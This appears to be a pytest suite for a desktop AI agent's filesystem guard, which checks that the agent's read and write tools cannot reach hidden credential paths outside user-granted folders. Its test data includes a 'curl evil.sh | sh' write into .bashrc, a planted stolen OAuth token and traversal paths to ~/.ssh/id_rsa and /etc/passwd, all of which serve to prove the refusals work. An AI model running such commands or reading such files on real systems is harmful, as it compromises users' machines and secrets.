"""The hidden-path floor, judged by deepagents' OWN tools, matcher and disk.

The hole this closes is invisible to any test that asserts our own predicate,
because our predicate was never the thing deciding: `_check_fs_permission`
returns "allow" when no rule matches, and no rule can match a path with a hidden
segment. So the tests that matter here compose the PRODUCTION stack —
`HostFilesystemRules` + `FilesystemBackend(virtual_mode=False)` + the floor,
exactly as `factory._host_default_backend` composes it — drive the real
`read_file` / `write_file` tools, and then look at the real filesystem.
"""

from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from deepagents.backends.filesystem import FilesystemBackend
from deepagents.middleware._fs_interrupt import (
    _build_interrupt_on_from_permissions,
)
from deepagents.middleware.filesystem import (
    FilesystemMiddleware,
    FilesystemPermission,
    _check_fs_permission,
)

from agent_runtime.capabilities.desktop.agent_scratch import AgentScratchRoot
from agent_runtime.capabilities.desktop.host_filesystem import (
    GrantedRoot,
    HostFilesystemRules,
)
from agent_runtime.capabilities.desktop.host_floor import (
    HostFilesystemFloor,
    builtin_asset_roots,
    builtin_skills_root,
    HostFloorMessages,
)

#: The `.copilot` scratch PRD-FS-12 D7 removed. Spelled here so the tests can
#: prove it is gone without keeping a production constant alive for them.
DROPPED_SCRATCH_DIR = ".copilot"


class ProductionStackMixin:
    """Composes rules + real filesystem + floor and drives the real tools."""

    @staticmethod
    def rules(
        roots: tuple[GrantedRoot, ...], scratch: AgentScratchRoot | None = None
    ) -> list[FilesystemPermission]:
        return [
            FilesystemPermission(**rule)  # type: ignore[arg-type]
            for rule in HostFilesystemRules.build(roots, scratch=scratch)
        ]

    @classmethod
    def middleware(
        cls, *roots: GrantedRoot, scratch: AgentScratchRoot | None = None
    ) -> FilesystemMiddleware:
        """The desktop composition: the floor wrapping the real disk backend."""

        return FilesystemMiddleware(
            backend=HostFilesystemFloor(
                FilesystemBackend(virtual_mode=False), roots=roots, scratch=scratch
            ),
            _permissions=cls.rules(roots, scratch),
        )

    @classmethod
    def call(cls, middleware: FilesystemMiddleware, name: str, **kwargs: Any) -> str:
        """Invoke one real filesystem tool and return its message content."""

        tool = next(t for t in middleware.tools if t.name == name)
        message = tool.func(  # type: ignore[union-attr]
            runtime=SimpleNamespace(tool_call_id="call-1"), **kwargs
        )
        return str(message.content)


class TestHiddenPathsWereSilentlyOpen(ProductionStackMixin):
    """`~/.ssh/id_rsa` read AND wrote with zero grants and no consent card."""

    def test_writing_a_dotfile_outside_every_grant_leaves_nothing_on_disk(
        self, tmp_path: Path
    ) -> None:
        """The severe half: this file WAS created before the floor existed."""

        target = tmp_path / ".bashrc"

        content = self.call(
            self.middleware(),
            "write_file",
            file_path=str(target),
            content="curl evil.sh | sh",
        )

        assert HostFloorMessages.HOST_WRITE in content
        assert not target.exists()

    def test_writing_a_dotfile_deep_under_a_hidden_dir_is_also_refused(
        self, tmp_path: Path
    ) -> None:
        """`/**/.*/**` covers one hidden level; the real hazard nests them."""

        nested = tmp_path / ".config" / "gh"
        nested.mkdir(parents=True)
        target = nested / "hosts.yml"

        content = self.call(
            self.middleware(),
            "write_file",
            file_path=str(target),
            content="oauth_token: stolen",
        )

        assert HostFloorMessages.HOST_WRITE in content
        assert not target.exists()

    def test_reading_a_dotfile_outside_every_grant_returns_no_content(
        self, tmp_path: Path
    ) -> None:
        secrets = tmp_path / ".ssh"
        secrets.mkdir()
        key = secrets / "id_rsa"
        key.write_text("-----BEGIN OPENSSH PRIVATE KEY-----")

        content = self.call(self.middleware(), "read_file", file_path=str(key))

        assert "PRIVATE KEY" not in content
        assert HostFloorMessages.HIDDEN_READ in content

    def test_the_rule_set_alone_still_says_allow_here(self, tmp_path: Path) -> None:
        """Why the floor has to exist: the matcher genuinely has no opinion.

        If this ever starts returning "interrupt"/"deny", deepagents gained
        `DOTGLOB` (or an equivalent) and the floor's read lane is redundant —
        which is worth learning from a failing test rather than a review.
        """

        rules = self.rules(())
        hidden = str(tmp_path / ".ssh" / "id_rsa")

        assert _check_fs_permission(rules, "read", hidden) == "allow"
        assert _check_fs_permission(rules, "write", hidden) == "allow"


class TestAttachedFoldersKeepWorking(ProductionStackMixin):
    """The floor must not take back what attaching a folder buys."""

    def test_a_dotfile_inside_an_attached_folder_still_reads(
        self, tmp_path: Path
    ) -> None:
        root = tmp_path / "Projects"
        (root / ".git").mkdir(parents=True)
        (root / ".git" / "config").write_text("[core]\n")

        content = self.call(
            self.middleware(GrantedRoot(path=str(root))),
            "read_file",
            file_path=str(root / ".git" / "config"),
        )

        assert "[core]" in content

    def test_each_of_several_attached_folders_reads_its_own_dotfiles(
        self, tmp_path: Path
    ) -> None:
        """Multi-grant: one folder's allowance must not stand in for another's."""

        roots = []
        for name in ("Projects", "Notes", "Reports"):
            folder = tmp_path / name
            folder.mkdir()
            (folder / ".marker").write_text(f"inside {name}")
            roots.append(GrantedRoot(path=str(folder)))
        outside = tmp_path / "Secrets"
        outside.mkdir()
        (outside / ".marker").write_text("inside Secrets")
        middleware = self.middleware(*roots)

        for root in roots:
            content = self.call(
                middleware, "read_file", file_path=f"{root.path}/.marker"
            )
            assert f"inside {Path(root.path).name}" in content

        refused = self.call(middleware, "read_file", file_path=str(outside / ".marker"))
        assert "inside Secrets" not in refused

    def test_an_approved_visible_read_outside_every_grant_still_works(
        self, tmp_path: Path
    ) -> None:
        """The floor must never overrule a human.

        A visible ungranted path is an `interrupt`: the user is asked, and on
        approval the tool runs and reaches the backend. If the floor refused
        there, approving would produce a permission error — the promise
        "approving yields a REAL listing" reversed.
        """

        readme = tmp_path / "notes.txt"
        readme.write_text("plain content")
        assert _check_fs_permission(self.rules(()), "read", str(readme)) == "interrupt"

        content = self.call(self.middleware(), "read_file", file_path=str(readme))

        assert "plain content" in content

    @pytest.mark.parametrize("writable", [True, False])
    def test_a_granted_folder_is_never_written_into_at_all(
        self, tmp_path: Path, writable: bool
    ) -> None:
        """The grant's MODE decides, end to end through the real tool stack.

        The path deliberately carries a HIDDEN segment. That is the case the
        rule set cannot express — `wcmatch` runs without DOTGLOB, so no pattern
        sees `.copilot` — which makes this the test that proves the FLOOR agrees
        with rule 3 rather than quietly overruling it. When the two disagreed,
        the rule allowed and the floor refused, and the write vanished with a
        message about a lane the user had never heard of.
        """

        root = tmp_path / "Projects"
        (root / DROPPED_SCRATCH_DIR).mkdir(parents=True)
        target = root / DROPPED_SCRATCH_DIR / "notes.json"

        content = self.call(
            self.middleware(GrantedRoot(path=str(root), writable=writable)),
            "write_file",
            file_path=str(target),
            content="{}",
        )

        if writable:
            assert HostFloorMessages.HOST_WRITE not in content
            assert target.read_text() == "{}"
        else:
            assert HostFloorMessages.HOST_WRITE in content
            assert not target.exists()

    def test_the_agent_scratch_writes_and_reads_back_through_the_real_stack(
        self, tmp_path: Path
    ) -> None:
        """D3 + §5, end to end, with ZERO grants.

        The whole point of moving the scratch: the agent has a place to work
        that does not depend on the user having attached anything. The path is
        doubly hidden (`.0xcopilot/.tmp`), so this passes only if the literal
        rule matches AND the floor admits the subtree — the two halves the
        dotted-segment trap breaks independently.
        """

        scratch = AgentScratchRoot(tmp_path / ".0xcopilot" / ".tmp")
        target = scratch.path / "conv-1" / "run-1" / "tool-results" / "out.txt"
        target.parent.mkdir(parents=True)

        written = self.call(
            self.middleware(scratch=scratch),
            "write_file",
            file_path=str(target),
            content="offloaded",
        )
        assert HostFloorMessages.HOST_WRITE not in written
        assert target.read_text() == "offloaded"

        read_back = self.call(
            self.middleware(scratch=scratch), "read_file", file_path=str(target)
        )
        assert "offloaded" in read_back

    def test_the_scratch_allow_does_not_reach_its_parent(self, tmp_path: Path) -> None:
        """§5: scoped to `$COPILOT_HOME/.tmp` and NOTHING above it.

        `COPILOT_HOME` also holds the staged runtime, the version marker and the
        download cache. A rule anchored one segment too high would hand the
        model the app's own installation.
        """

        home = tmp_path / ".0xcopilot"
        scratch = AgentScratchRoot(home / ".tmp")
        scratch.path.mkdir(parents=True)
        sibling = home / "marker.json"

        content = self.call(
            self.middleware(scratch=scratch),
            "write_file",
            file_path=str(sibling),
            content="{}",
        )

        assert HostFloorMessages.HOST_WRITE in content
        assert not sibling.exists()


class TestBulkOpsAreDelegatedBecauseConsentAlreadyFires:
    """The floor leaves `ls`/`glob`/`grep` alone — pin WHY, against deepagents.

    Their HITL predicate fires whenever the call's subtree overlaps an
    interrupt-rule anchor, and rule 4's anchor is `/`. So a bulk call over a
    hidden folder is already stopped and asked about, and refusing it in the
    floor would deny a read the user had just approved. Narrow rule 4 and these
    fail — which is the point.
    """

    ROOTS = (GrantedRoot(path="/Users/ada/Projects"),)

    @classmethod
    def _predicate(cls, tool: str) -> Any:
        rules = [
            FilesystemPermission(**rule)  # type: ignore[arg-type]
            for rule in HostFilesystemRules.build(cls.ROOTS)
        ]
        config = _build_interrupt_on_from_permissions(rules)[tool]
        return config["when"] if isinstance(config, dict) else config.when

    @pytest.mark.parametrize("tool", ["ls", "glob", "grep"])
    @pytest.mark.parametrize(
        "path", ["/Users/ada/.ssh", "/Users/ada/.config/gh", "/Users/ada/Downloads"]
    )
    def test_a_bulk_call_outside_every_grant_asks_first(
        self, tool: str, path: str
    ) -> None:
        request = SimpleNamespace(tool_call={"args": {"path": path}})

        assert self._predicate(tool)(request) is True


class TestFloorVerdicts:
    """The verdict surface on its own, including the shapes disk tests can't hit."""

    ROOT = "/Users/ada/Projects"
    SCRATCH = AgentScratchRoot(Path("/Users/ada/.0xcopilot/.tmp"))

    @classmethod
    def floor(
        cls, *roots: GrantedRoot, scratch: AgentScratchRoot | None = None
    ) -> HostFilesystemFloor:
        return HostFilesystemFloor(object(), roots=roots, scratch=scratch)

    @pytest.mark.parametrize(
        ("path", "blind"),
        [
            ("/Users/ada/Projects/a.md", False),
            ("/Users/ada/.ssh/id_rsa", True),
            ("/Users/ada/.a/.b/.c", True),
            ("/Users/ada/Projects/.env", True),
            ("/.DS_Store", True),
            ("/Users/ada/../etc/passwd", True),
        ],
    )
    def test_matcher_blindness_is_detected_per_segment(
        self, path: str, blind: bool
    ) -> None:
        assert HostFilesystemFloor.is_matcher_blind(path) is blind

    def test_a_prefix_sibling_is_not_admitted_by_a_grant(self) -> None:
        floor = self.floor(GrantedRoot(path=self.ROOT))

        assert floor.permits_read(f"{self.ROOT}/.env") is True
        assert floor.permits_read("/Users/ada/ProjectsSecret/.env") is False

    def test_a_traversal_segment_is_never_admitted(self) -> None:
        """Lexical parent-walking cannot be trusted through a symlink."""

        floor = self.floor(
            GrantedRoot(path=self.ROOT, writable=True), scratch=self.SCRATCH
        )

        assert floor.permits_read(f"{self.ROOT}/sub/../../.ssh/id_rsa") is False
        assert floor.permits_write(f"{self.SCRATCH.posix}/conv/../../../x") is False

    def test_the_agents_own_namespaces_are_none_of_the_floors_business(self) -> None:
        floor = self.floor()

        for path in ("/memories/user/profile.json", "/drafts/.reply.md", "/skills/x"):
            assert floor.permits_read(path) is True
            assert floor.permits_write(path) is True

    def test_every_host_write_outside_the_agent_scratch_is_refused(self) -> None:
        floor = self.floor(
            GrantedRoot(path=self.ROOT, writable=True), scratch=self.SCRATCH
        )

        assert floor.permits_write(f"{self.SCRATCH.posix}/conv/run/x.json") is True
        assert floor.permits_write(self.SCRATCH.posix) is True
        # A WRITABLE grant IS writable — the floor must agree with rule 3 or
        # the two layers contradict each other and the rule silently loses.
        assert floor.permits_write(f"{self.ROOT}/notes.md") is True
        # …including a hidden segment inside it, which is the case the rule set
        # structurally cannot express (no DOTGLOB) and the floor exists for.
        assert floor.permits_write(f"{self.ROOT}/{DROPPED_SCRATCH_DIR}/n.json") is True
        assert floor.permits_write("/tmp/anything.txt") is False
        assert floor.permits_write("/Users/ada/Downloads/x") is False
        # ...and a sibling that merely starts with the same characters is not
        # inside it — `_within` compares SEGMENTS, not string prefixes.
        assert floor.permits_write("/Users/ada/.0xcopilot/.tmp-evil/x") is False
        assert floor.permits_write("/Users/ada/.0xcopilot/secrets.json") is False

    def test_a_run_with_no_scratch_still_writes_only_where_it_was_granted(
        self,
    ) -> None:
        """An unusable scratch degrades to "no scratch", never to "open".

        It must not take the user's own grant down with it: the two allowances
        are independent, and losing ours is not a reason to revoke theirs.
        """

        floor = self.floor(GrantedRoot(path=self.ROOT, writable=True), scratch=None)

        assert floor.permits_write(f"{self.SCRATCH.posix}/conv/x.json") is False
        assert floor.permits_write(f"{self.ROOT}/notes.md") is True
        assert floor.permits_write("/Users/ada/Downloads/x") is False

    def test_a_read_only_grant_is_refused_by_the_floor_too(self) -> None:
        """The grant's MODE is honoured at BOTH layers, or it is honoured at neither."""

        floor = self.floor(GrantedRoot(path=self.ROOT, writable=False), scratch=None)

        assert floor.permits_write(f"{self.ROOT}/notes.md") is False

    def test_a_hidden_segment_beneath_the_scratch_is_still_admitted(self) -> None:
        """The half the LITERAL rule cannot cover, and why the floor is here.

        `<scratch>/**` is invisible to a path carrying a further dotted segment
        (no DOTGLOB), so `_check_fs_permission` has no opinion and falls through
        to allow-by-default. The floor is what actually decides, and it must
        decide YES — the agent's own subtree — rather than inheriting the
        hidden-path refusal meant for `~/.ssh`.
        """

        floor = self.floor(scratch=self.SCRATCH)
        nested = f"{self.SCRATCH.posix}/conv/.cache/x"

        assert HostFilesystemFloor.is_matcher_blind(nested) is True
        assert floor.permits_read(nested) is True
        assert floor.permits_write(nested) is True

    def test_batch_downloads_refuse_per_path_rather_than_wholesale(self) -> None:
        """Skills / memory / summarization read through this op, not `read`."""

        served = [SimpleNamespace(path="/Users/ada/Projects/a.md")]
        floor = HostFilesystemFloor(
            SimpleNamespace(download_files=lambda paths: list(served)),
            roots=(GrantedRoot(path=self.ROOT),),
        )

        results = floor.download_files(
            ["/Users/ada/.ssh/id_rsa", "/Users/ada/Projects/a.md"]
        )

        assert results[0].error == "permission_denied"
        assert results[0].content is None
        assert results[1] is served[0]


class TestShippedSkillsAreReadable:
    """The runtime's own Skills, which were 100% dead in the packaged app.

    Built-in Skills ship at ``<install>/services/ai-backend/skills/<name>/SKILL.md``
    and a packaged install roots ``<install>`` under ``$COPILOT_HOME`` — which is
    ``~/.0xcopilot``. One dotted segment blinds deepagents' matcher, so the rule
    set had no opinion and the floor refused. deepagents' loader logs
    ``permission_denied; skipping`` and carries on, so nothing surfaced: 2 of 2
    shipped skills silently absent from every run, while a checkout that happened
    to sit outside a dotted directory worked and hid it.
    """

    INSTALL = "/Users/ada/.0xcopilot/runtime/darwin-arm64/services/ai-backend"
    SKILLS = f"{INSTALL}/skills"
    SKILL = f"{INSTALL}/skills/web-search-discipline/SKILL.md"

    @classmethod
    def floor(cls, *, wired: bool) -> HostFilesystemFloor:
        return HostFilesystemFloor(object(), assets=(cls.SKILLS,) if wired else ())

    def test_the_packaged_path_is_matcher_blind_which_is_why_this_is_needed(
        self,
    ) -> None:
        assert HostFilesystemFloor.is_matcher_blind(self.SKILL) is True

    def test_an_unwired_floor_refuses_the_shipped_skill(self) -> None:
        assert self.floor(wired=False).permits_read(self.SKILL) is False

    def test_a_wired_floor_admits_it(self) -> None:
        assert self.floor(wired=True).permits_read(self.SKILL) is True

    def test_shipped_assets_are_never_writable(self) -> None:
        # Read-only by construction: an asset root is content we ship, so a
        # write there is a bug in us, not a capability to grant.
        assert self.floor(wired=True).permits_write(self.SKILL) is False

    @pytest.mark.parametrize(
        "path",
        [
            f"{INSTALL}/../../../.ssh/id_rsa",
            "/Users/ada/.ssh/id_rsa",
            f"{INSTALL}/.env",
            f"{INSTALL}/skills-other/.secret",
        ],
    )
    def test_the_allow_does_not_leak_upward_or_sideways(self, path: str) -> None:
        # A prefix comparison would admit `skills-other`; traversal would admit
        # the whole disk. Neither may pass.
        assert self.floor(wired=True).permits_read(path) is False

    def test_the_loader_op_is_the_one_that_was_failing(self) -> None:
        # Skills load through `download_files`, and its refusal string is
        # verbatim what the live packaged app logged.
        served = [SimpleNamespace(path=self.SKILL)]
        floor = HostFilesystemFloor(
            SimpleNamespace(download_files=lambda paths: list(served)),
            assets=(self.SKILLS,),
        )

        assert floor.download_files([self.SKILL])[0] is served[0]

        refusing = HostFilesystemFloor(
            SimpleNamespace(download_files=lambda paths: list(served))
        )

        assert refusing.download_files([self.SKILL])[0].error == "permission_denied"


class TestTheAssetRootIsTheOneTheLoaderUses:
    """Two derivations of one path is what let the floor and loader disagree."""

    def test_the_worker_constant_is_the_floors_own_answer(self) -> None:
        from runtime_worker.dependencies import BUILTIN_SKILLS_ROOT

        assert BUILTIN_SKILLS_ROOT.resolve() == builtin_skills_root().resolve()

    def test_the_asset_root_is_advertised_only_when_it_exists(self) -> None:
        # An allow-rule for an absent directory is a hole waiting for someone
        # to create it.
        roots = builtin_asset_roots()

        if builtin_skills_root().is_dir():
            assert roots == (builtin_skills_root().as_posix(),)
        else:
            assert roots == ()
